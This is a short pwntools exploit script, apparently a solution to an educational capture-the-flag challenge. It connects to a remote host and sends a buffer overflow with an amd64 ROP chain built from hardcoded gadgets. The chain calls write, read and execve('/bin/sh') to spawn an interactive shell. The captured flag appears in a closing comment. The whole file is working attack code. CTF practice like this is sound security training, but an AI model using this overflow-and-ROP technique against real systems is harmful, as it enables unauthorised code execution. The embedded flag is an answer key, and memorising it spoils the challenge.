from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('edu-ctf.zoolab.org', 10003)
# r = process('./share/chal')
# gdb.attach(r)

pop_rax_ret = 0x447b27 # pop rax ; ret
pop_rdi_ret = 0x401e3f # pop rdi ; ret
pop_rsi_ret = 0x409e6e # pop rsi ; ret
pop_rdx_ret = 0x47ed0b # pop rdx ; pop rbx ; ret
syscall_ret = 0x414506 # syscall ; ret
syscall     = 0x401bf4 # syscall
msg_addr    = 0x498004 # show me rop\n>
writable_addr = 0x4c8000

ROP = flat([
    # write(1, buf, 0xE)
    pop_rdi_ret, 1,
    pop_rsi_ret, msg_addr,
    pop_rdx_ret, 0xE,
    0xE,
    pop_rax_ret, 1,
    syscall_ret,

    # read(0, buf, 0xE)
    pop_rdi_ret, 0,
    pop_rsi_ret, writable_addr,
    pop_rdx_ret, 0xE,
    0xE,
    pop_rax_ret, 0,
    syscall_ret,

    # execve('/bin/sh', 0, 0)
    pop_rdi_ret, writable_addr,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0,
    0,
    pop_rax_ret, 0x3B,
    syscall
])

r.sendafter('show me rop\n> ', b'A'*0x28 + ROP)
r.sendafter('show me rop\n> ', b'/bin/sh\x00')
r.interactive()

# FLAG{chocolate_c378985d629e99a4e86213db0cd5e70d}